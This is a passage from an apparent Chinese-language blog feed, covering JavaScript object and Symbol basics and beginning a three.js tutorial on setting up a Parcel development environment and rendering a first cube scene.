class="line">perso2.age = <span class="number">23</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//字面量的创建方式</span></span><br><span class="line"><span class="keyword">var</span> person3 = &#123;</span><br><span class="line">name:<span class="string">&quot;jakezhang&quot;</span>,<span class="comment">//name如果是保留字、有连接符/空格，则要&#x27;name-p&#x27;，即使用字符串</span></span><br><span class="line">age:<span class="number">23</span>,</span><br><span class="line">action:<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">this</span>.name);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>以上任意一种方式都可以创建一个对象实例，当然更多的写法和设计思想以后的文章再做体现。在实际的开发中我们用的最多的是字面量的方式，因为这种语法要求的代码量少，而且能够给人封装数据的感觉。这里引用一个红宝书的例子：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">displayInfo</span>(<span class="params">args</span>) </span>&#123; </span><br><span class="line"> <span class="keyword">var</span> output = <span class="string">&quot;&quot;</span>; </span><br><span class="line"> <span class="keyword">if</span> (<span class="keyword">typeof</span> args.name == <span class="string">&quot;string&quot;</span>)&#123;</span><br><span class="line"> output += <span class="string">&quot;Name: &quot;</span> + args.name + <span class="string">&quot;\n&quot;</span>; </span><br><span class="line"> &#125; </span><br><span class="line"> <span class="keyword">if</span> (<span class="keyword">typeof</span> args.age == <span class="string">&quot;number&quot;</span>) &#123; </span><br><span class="line"> output += <span class="string">&quot;Age: &quot;</span> + args.age + <span class="string">&quot;\n&quot;</span>; </span><br><span class="line"> &#125; </span><br><span class="line"> alert(output); </span><br><span class="line">&#125; </span><br><span class="line">displayInfo(&#123; </span><br><span class="line"> name: <span class="string">&quot;Nicholas&quot;</span>, </span><br><span class="line"> age: <span class="number">29</span> </span><br><span class="line">&#125;); </span><br><span class="line">displayInfo(&#123; </span><br><span class="line"> name: <span class="string">&quot;Greg&quot;</span> </span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>代码相信都看得懂~</p><p><strong>Object 的每个实例都具有下列属性和方法：</strong></p><ul><li><code>constructor</code>：保存着用于创建当前对象的函数。对于前面的例子而言，构造函数（<code>constructor</code>）就是 <code>Object()</code>。</li><li><code>hasOwnProperty(propertyName)</code>：用于检查给定的属性在当前对象实例中（而不是在实例的原型中）是否存在。其中，作为参数的属性名（<code>propertyName</code>）必须以字符串形式指定（例如：<code>o.hasOwnProperty(&quot;name&quot;)</code>）。</li><li><code>isPrototypeOf(object)</code>：用于检查传入的对象是否是传入对象的原型。</li><li><code>propertyIsEnumerable(propertyName</code>)：用于检查给定的属性是否能够使用 for-in 语句来枚举。与<code>hasOwnProperty()</code>方法一样，作为参数的属性名必须以字符串形式指定。</li><li><code>toLocaleString()</code>：返回对象的字符串表示，该字符串与执行环境的地区对应。</li><li><code>toString()</code>：返回对象的字符串表示。</li><li><code>valueOf()</code>：返回对象的字符串、数值或布尔值表示。通常与 toString()方法的返回值相同。</li></ul><p>由于在 ECMAScript 中 Object 是所有对象的基础，因此所有对象都具有这些基本的属性和方法。</p><h3 id="9、基本数据类型和引用类型值的比较"><a href="#9、基本数据类型和引用类型值的比较" class="headerlink" title="9、基本数据类型和引用类型值的比较"></a>9、基本数据类型和引用类型值的比较</h3><h4 id="基本数据类型"><a href="#基本数据类型" class="headerlink" title="基本数据类型"></a><strong>基本数据类型</strong></h4><ol><li><strong>值是不可变的</strong></li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> name = <span class="string">&quot;Jake Zhang&quot;</span>;</span><br><span class="line">name.toUpperCase();<span class="comment">//输出 JAKE ZHANG</span></span><br><span class="line"><span class="built_in">console</span>.log(name);<span class="comment">// 输出 Jake Zhang</span></span><br></pre></td></tr></table></figure><p>由以上代码可看出基本数据类型的值是不可变的。</p><ol><li><strong>存放在栈区</strong> 基本类型值指的是简单的数据段，按值访问，可操作保存在变量中的实际的值，其占据空间小、大小固定，属于被频繁使用的数据，所以放入栈（<code>stack</code>）中存储。</li><li><strong>值的比较</strong></li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> n = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">var</span> m = <span class="literal">true</span>;</span><br><span class="line"><span class="built_in">console</span>.log(n == m);<span class="comment">//true</span></span><br><span class="line"><span class="built_in">console</span>.log(n === m);<span class="comment">// false</span></span><br></pre></td></tr></table></figure><p>“==”：只进行值的比较，会进行数据类型转换；</p><p>“===”：不会转换数据类型。</p><h4 id="引用数据类型"><a href="#引用数据类型" class="headerlink" title="引用数据类型"></a>引用数据类型</h4><ol><li><strong>值是可变的</strong></li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> person = &#123;</span><br><span class="line">    name:<span class="string">&#x27;jake&#x27;</span>,</span><br><span class="line">        age:<span class="number">22</span>,</span><br><span class="line">        action:<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">         <span class="built_in">console</span>.log(<span class="string">&quot;do something!&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">person.age = <span class="number">23</span>;</span><br><span class="line"><span class="built_in">console</span>.log(person.age)<span class="comment">// 23</span></span><br></pre></td></tr></table></figure><p>有上面的代码可看出引用数据 类型可以拥有一个或多个属性和方法，而且是可以动态修改的。</p><ol><li><strong>同时存放在栈内存和堆内存</strong> 引用数据类型是存放在堆（heap）中的对象，占据空间大、大小不固定，如果存放在栈中，会影响程序运行的性能；引用数据类型在栈中存储了指针，该指针指向堆中该实体的起始地址，当解释器寻找引用值时，会首先检索其在栈中的地址，取得地址后从堆中获得实体。（有关js中栈和堆的详解可参考文章[(<a href="https://link.juejin.cn/?target=https://www.cnblogs.com/heioray/p/9487093.html">www.cnblogs.com/heioray/p/9…</a>)）</li><li><strong>值的比较</strong> 当从一个变量向另一个变量赋引用类型的值时，同样也会将存储在变量中的对象的值复制一份到位新变量分配的空间中。</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> person1 = &#123;</span><br><span class="line">  age:<span class="number">20</span></span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">var</span> person2 = person1;</span><br><span class="line">person2.age = <span class="number">23</span>;</span><br><span class="line"><span class="built_in">console</span>.log(person1.age = person2.age)<span class="comment">// true</span></span><br></pre></td></tr></table></figure><p>前面讲到基本数据类型和引用数据类型存储于内存中的位置不一样，引用数据类型存储在堆中的对象，与此同时，在栈中存储了指针，而这个指针的指向正是堆中实体的起始位置。变量person1初始化时，person1指针指向该对象{age：20}的地址，将person1赋给person2后，person2又指向该对象{age：20}的地址，这两个变量指向了同一个对象。因此改变其中任何一个变量，都会相互影响。</p><p><img src="https://user-gold-cdn.xitu.io/2019/11/9/16e50425886c10a9?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="ZJK"></p><p>此时，如果取消某一个变量对于原对象的引用，不会影响到另一个变量。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = &#123;<span class="attr">age</span>:<span class="number">22</span>&#125;</span><br><span class="line"><span class="keyword">var</span> b = a;</span><br><span class="line">a = <span class="number">1</span>;</span><br><span class="line"><span class="built_in">console</span>.log(b);<span class="comment">//&#123;age:22&#125;</span></span><br></pre></td></tr></table></figure><p>上面代码中，a和b指向同一个对象，然后a的值变为1，这时不会对b产生影响，b还是指向原来的那个对象。</p><h3 id="10-Symbol的使用"><a href="#10-Symbol的使用" class="headerlink" title="10.Symbol的使用"></a>10.Symbol的使用</h3><ul><li>Symbol是一种基本类型，由Symbol函数生成</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 没有参数的情况</span></span><br><span class="line"><span class="keyword">var</span> s1 = <span class="built_in">Symbol</span>();</span><br><span class="line"><span class="keyword">var</span> s2 = <span class="built_in">Symbol</span>();</span><br><span class="line">s1 === s2 <span class="comment">// false</span></span><br><span class="line"><span class="comment">// 有参数的情况</span></span><br><span class="line"><span class="keyword">var</span> s1 = <span class="built_in">Symbol</span>(<span class="string">&quot;foo&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> s2 = <span class="built_in">Symbol</span>(<span class="string">&quot;foo&quot;</span>);</span><br><span class="line">s1 === s2 <span class="comment">// false</span></span><br><span class="line">a.mySymbol = <span class="string">&#x27;hello&#x27;</span>  <span class="comment">// 错误</span></span><br></pre></td></tr></table></figure><ul><li>不能new，会报错，返回一个值，不是对象</li><li>Symbol 函数可以接受一个字符串作为参数</li><li>instanceof 的结果为 false</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> s = <span class="built_in">Symbol</span>(<span class="string">&#x27;foo&#x27;</span>);</span><br><span class="line"><span class="built_in">console</span>.log(s <span class="keyword">instanceof</span> <span class="built_in">Symbol</span>); <span class="comment">// false</span></span><br></pre></td></tr></table></figure><ul><li>Symbol 值可以作为标识符，用于对象的属性名，可以保证不会出现同名的属性。</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> mySymbol = <span class="built_in">Symbol</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 第一种写法</span></span><br><span class="line"><span class="keyword">var</span> a = &#123;&#125;;</span><br><span class="line">a[mySymbol] = <span class="string">&#x27;Hello!&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 第二种写法</span></span><br><span class="line"><span class="keyword">var</span> a = &#123;</span><br><span class="line">  [mySymbol]: <span class="string">&#x27;Hello!&#x27;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 第三种写法</span></span><br><span class="line"><span class="keyword">var</span> a = &#123;&#125;;</span><br><span class="line"><span class="built_in">Object</span>.defineProperty(a, mySymbol, &#123; <span class="attr">value</span>: <span class="string">&#x27;Hello!&#x27;</span> &#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 以上写法都得到同样结果</span></span><br><span class="line"><span class="built_in">console</span>.log(a[mySymbol]); <span class="comment">// &quot;Hello!&quot;</span></span><br></pre></td></tr></table></figure><ul><li><p>该属性不会出现在 for…in、for…of 循环中，也不会被 Object.keys()、Object.getOwnPropertyNames()、JSON.stringify() 返回</p></li><li><p>使用同一个 Symbol 值，可以使用 Symbol.for</p></li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> s1 = <span class="built_in">Symbol</span>.for(<span class="string">&#x27;foo&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> s2 = <span class="built_in">Symbol</span>.for(<span class="string">&#x27;foo&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(s1 === s2); <span class="comment">// true</span></span><br></pre></td></tr></table></figure><p>使用<br>当需要区分形状，正方形，圆形，菱形 会使用 const shape = { triangle: ‘triangle’, circle: ‘circle’},不优雅，可以使用<br>const shape = { triangle: Symbol(), circle: Symbol()},</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="JavaScript" scheme="http://aiolimp.com/categories/JavaScript/"/>
    
    
    <category term="JavaScript" scheme="http://aiolimp.com/tags/JavaScript/"/>
    
  </entry>
  
  <entry>
    <title>three.js物体基本操作</title>
    <link href="http://aiolimp.com/2022/11/01/three/"/>
    <id>http://aiolimp.com/2022/11/01/three/</id>
    <published>2022-11-01T08:57:49.000Z</published>
    <updated>2023-03-05T14:18:03.286Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="three-js物体基本操作"><a href="#three-js物体基本操作" class="headerlink" title="three.js物体基本操作"></a>three.js物体基本操作</h2><ul><li><a href="#%E4%B8%80%E6%9C%AC%E5%9C%B0%E6%90%AD%E5%BB%BAthreejs%E5%AE%98%E6%96%B9%E6%96%87%E6%A1%A3%E7%BD%91%E7%AB%99">一、本地搭建Threejs官方文档网站</a></li><li><a href="#%E4%BA%8C%E4%BD%BF%E7%94%A8parcel%E6%90%AD%E5%BB%BAthreejs%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83">二、使用parcel搭建three.js开发环境</a></li><li><a href="#%E4%B8%89threejs%E6%B8%B2%E6%9F%93%E7%AC%AC%E4%B8%80%E4%B8%AA%E5%9C%BA%E6%99%AF%E5%92%8C%E7%89%A9%E4%BD%93">三、Threejs渲染第一个场景和物体</a></li><li><a href="#%E5%9B%9Bthreejs%E8%BD%A8%E9%81%93%E6%8E%A7%E5%88%B6%E5%99%A8%E6%9F%A5%E7%9C%8B%E7%89%A9%E4%BD%93">四、Threejs轨道控制器查看物体</a></li><li><a href="#%E4%BA%94threejs%E6%8E%A7%E5%88%B6%E7%89%A9%E4%BD%93%E7%A7%BB%E5%8A%A8">五、Threejs控制物体移动</a></li><li><a href="#%E5%85%ADthreejs%E6%B7%BB%E5%8A%A0%E5%9D%90%E6%A0%87%E8%BD%B4%E8%BE%85%E5%8A%A9%E5%99%A8">六、Threejs添加坐标轴辅助器</a></li><li><a href="#%E4%B8%83threejs%E7%89%A9%E4%BD%93%E7%BC%A9%E6%94%BE%E4%B8%8E%E6%97%8B%E8%BD%AC">七、Threejs物体缩放与旋转</a></li><li><a href="#%E5%85%ABthreejs%E6%AD%A3%E7%A1%AE%E5%A4%84%E7%90%86%E5%8A%A8%E7%94%BB%E8%BF%90%E5%8A%A8">八、Threejs正确处理动画运动</a></li><li><a href="#%E4%B9%9Dthreejs%E4%B8%ADclock%E8%B7%9F%E8%B8%AA%E6%97%B6%E9%97%B4%E5%A4%84%E7%90%86%E5%8A%A8%E7%94%BB">九、Threejs中Clock跟踪时间处理动画</a></li><li><a href="#%E5%8D%81gsap%E5%8A%A8%E7%94%BB%E5%BA%93%E4%BD%BF%E7%94%A8">十、Gsap动画库使用</a></li><li><a href="#%E5%8D%81%E4%B8%80%E7%94%BB%E5%B8%83%E8%87%AA%E9%80%82%E5%BA%94%E5%B1%8F%E5%B9%95%E5%A4%A7%E5%B0%8F%E4%B8%8E%E5%85%A8%E5%B1%8F">十一、画布自适应屏幕大小与全屏</a></li><li><a href="#%E5%8D%81%E4%BA%8C%E5%BA%94%E7%94%A8%E5%9B%BE%E5%BD%A2%E7%94%A8%E6%88%B7%E7%95%8C%E9%9D%A2%E6%9B%B4%E6%94%B9%E5%8F%98%E9%87%8F">十二、应用图形用户界面更改变量</a></li></ul><h2 id="一、本地搭建Threejs官方文档网站"><a href="#一、本地搭建Threejs官方文档网站" class="headerlink" title="一、本地搭建Threejs官方文档网站"></a>一、本地搭建Threejs官方文档网站</h2><p>因为Three.js官网是国外的服务器，所以为了方便学习和快速的查阅文档，我们可以自己搭建Three.js官网和文档，方便随时查看案例和文档内容进行学习。</p><p><strong>1、首先进入threejs库GitHub地址：<a href="https://github.com/mrdoob/three.js">https://github.com/mrdoob/three.js</a></strong></p><p><strong>2、下载完整代码</strong></p><p><img src="https://i0.hdslb.com/bfs/article/48fcf222da2afa75e20a3e6e5292a854bebabb01.png@942w_474h_progressive.webp" alt="img"></p><p><strong>3、项目文件解压缩</strong></p><p><img src="https://i0.hdslb.com/bfs/article/064d111714e45ec2f3ca076377539f869641ff9f.png@942w_998h_progressive.webp" alt="img"></p><p><strong>4、命令行安装依赖</strong></p><p>一般安装可以用npm、yarn等包管理工具，课程以yarn举例，如果没有安装可以用npm install yarn -g进行安装。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yarn install</span><br></pre></td></tr></table></figure><p><img src="https://i0.hdslb.com/bfs/article/629b6eb8813a49a70866a39614d525bfbf32e241.png@942w_345h_progressive.webp" alt="img"></p><p><strong>5、启动项目</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yarn start</span><br></pre></td></tr></table></figure><p><img src="https://i0.hdslb.com/bfs/article/69aca9f2b22bd1b2a473e82fc9911888210026ee.png@942w_321h_progressive.webp" alt="img"></p><p>浏览器访问即可：<a href="http://localhost:8080/">http://localhost:8080</a></p><p><strong>6、文档目录介绍</strong></p><p><img src="https://i0.hdslb.com/bfs/article/f06ea28ece3bf4966884d12f31ae3ef2fa21b198.png@942w_639h_progressive.webp" alt="img"></p><p><strong>build目录：</strong></p><p><img src="https://i0.hdslb.com/bfs/article/2eaf352481ba76ff7b60cf55e0b19074c99d0556.png@654w_333h_progressive.webp" alt="img"></p><p><strong>docs文档：</strong></p><p>选择中文，查看中文文档。</p><p><img src="https://i0.hdslb.com/bfs/article/b3ac7dbfef00f80cf43c0875b0706a9a5ee601b8.png@942w_569h_progressive.webp" alt="img"></p><p><strong>examples案例：</strong></p><p><img src="https://i0.hdslb.com/bfs/article/d0bf8aea2caa58cd11ae82a9aa0a8d2029c097fb.png@942w_483h_progressive.webp" alt="img"></p><p>可以通过网址，找到具体的案例代码，如此处的文件名称是：webgl_animation_keyframes。因此可以在文件夹找到对应的代码文件</p><p><img src="https://i0.hdslb.com/bfs/article/ee61b8caef44caf66dc54719ed3ddac4480f39ff.png@942w_288h_progressive.webp" alt="img"></p><p><strong>editor目录：</strong></p><p>官方提供的可视化编辑器，可以直接导入模型，修改材质，添加光照效果等等。</p><p><img src="https://i0.hdslb.com/bfs/article/2a94f42e1f19fdbf31bde24cd3640926ae03ca65.png@942w_410h_progressive.webp" alt="img"></p><h2 id="二、使用parcel搭建three-js开发环境"><a href="#二、使用parcel搭建three-js开发环境" class="headerlink" title="二、使用parcel搭建three.js开发环境"></a>二、使用parcel搭建three.js开发环境</h2><p>为了方便模块化进行three.js项目的学习和开发，又不用学习太多的配置，增加学习成本，所以就使用Parcel这个web应用打包工具。</p><p>Parcel官网：<a href="https://v2.parceljs.cn/getting-started/webapp/">https://v2.parceljs.cn/getting-started/webapp/</a></p><h3 id="1、安装"><a href="#1、安装" class="headerlink" title="1、安装"></a>1、安装</h3><p>在开始之前，您需要安装 Node 和 Yarn 或 npm，并为您的项目创建一个目录。然后，使用 Yarn 将 Parcel 安装到您的应用程序中：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yarn add --dev parcel</span><br></pre></td></tr></table></figure><p>或者在使用 npm 运行时：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install --save-dev parcel</span><br></pre></td></tr></table></figure><h3 id="2、项目设置"><a href="#2、项目设置" class="headerlink" title="2、项目设置"></a>2、项目设置</h3><p>现在已经安装了 Parcel，让我们为我们的应用程序创建一些源文件。Parcel 接受任何类型的文件作为入口点，但 HTML 文件是一个很好的起点。Parcel 将从那里遵循您的所有依赖项来构建您的应用程序。</p><p>创建src文件夹，并且创建index.html文件</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;./assets/css/style.css&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;./main/main.js&quot;</span> <span class="attr">type</span>=<span class="string">&quot;module&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://i0.hdslb.com/bfs/article/a1ca45e07ba3ee682df2e98d6e3c66e8b84c6335.png@942w_359h_progressive.webp" alt="img"></p><h3 id="设置1个css文件"><a href="#设置1个css文件" class="headerlink" title="设置1个css文件"></a>设置1个css文件</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">* &#123;</span><br><span class="line">  <span class="attribute">margin</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">padding</span>: <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">body</span> &#123;</span><br><span class="line">  <span class="attribute">background-color</span>: skyblue;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p><img src="https://i0.hdslb.com/bfs/article/41d22c3b03134b6e21022d2a639de44dd7d4e6b5.png@942w_462h_progressive.webp" alt="img"></p><h3 id="创建一个main-js"><a href="#创建一个main-js" class="headerlink" title="创建一个main.js"></a>创建一个main.js</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> * <span class="keyword">as</span> THREE <span class="keyword">from</span> <span class="string">&quot;three&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// console.log(THREE);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 目标：了解three.js最基本的内容</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 1、创建场景</span></span><br><span class="line"><span class="keyword">const</span> scene = <span class="keyword">new</span> THREE.Scene();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2、创建相机</span></span><br><span class="line"><span class="keyword">const</span> camera = <span class="keyword">new</span> THREE.PerspectiveCamera(</span><br><span class="line">  <span class="number">75</span>,</span><br><span class="line">  <span class="built_in">window</span>.innerWidth / <span class="built_in">window</span>.innerHeight,</span><br><span class="line">  <span class="number">0.1</span>,</span><br><span class="line">  <span class="number">1000</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置相机位置</span></span><br><span class="line">camera.position.set(<span class="number">0</span>, <span class="number">0</span>, <span class="number">10</span>);</span><br><span class="line">scene.add(camera);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 添加物体</span></span><br><span class="line"><span class="comment">// 创建几何体</span></span><br><span class="line"><span class="keyword">const</span> cubeGeometry = <span class="keyword">new</span> THREE.BoxGeometry(<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line"><span class="keyword">const</span> cubeMaterial = <span class="keyword">new</span> THREE.MeshBasicMaterial(&#123; <span class="attr">color</span>: <span class="number">0xffff00</span> &#125;);</span><br><span class="line"><span class="comment">// 根据几何体和材质创建物体</span></span><br><span class="line"><span class="keyword">const</span> cube = <span class="keyword">new</span> THREE.Mesh(cubeGeometry, cubeMaterial);</span><br><span class="line"><span class="comment">// 将几何体添加到场景中</span></span><br><span class="line">scene.add(cube);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 初始化渲染器</span></span><br><span class="line"><span class="keyword">const</span> renderer = <span class="keyword">new</span> THREE.WebGLRenderer();</span><br><span class="line"><span class="comment">// 设置渲染的尺寸大小</span></span><br><span class="line">renderer.setSize(<span class="built_in">window</span>.innerWidth, <span class="built_in">window</span>.innerHeight);</span><br><span class="line"><span class="comment">// console.log(renderer);</span></span><br><span class="line"><span class="comment">// 将webgl渲染的canvas内容添加到body</span></span><br><span class="line"><span class="built_in">document</span>.body.appendChild(renderer.domElement);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用渲染器，通过相机将场景渲染进来</span></span><br><span class="line">renderer.render(scene, camera);</span><br></pre></td></tr></table></figure><h3 id="3、打包脚本"><a href="#3、打包脚本" class="headerlink" title="3、打包脚本"></a>3、打包脚本</h3><p>到目前为止，我们一直在parcel直接运行 CLI，但在您的package.json文件中创建一些脚本以简化此操作会很有用。我们还将设置一个脚本来使用该命令构建您的应用程序以进行生产。parcel build最后，您还可以使用该字段在一个地方声明您的条目source，这样您就不需要在每个parcel命令中重复它们。</p><p>package.json：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;01-three_basic&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;version&quot;</span>: <span class="string">&quot;1.0.0&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;description&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;main&quot;</span>: <span class="string">&quot;index.js&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;scripts&quot;</span>: &#123;</span><br><span class="line">    <span class="attr">&quot;dev&quot;</span>: <span class="string">&quot;parcel src/index.html&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;build&quot;</span>: 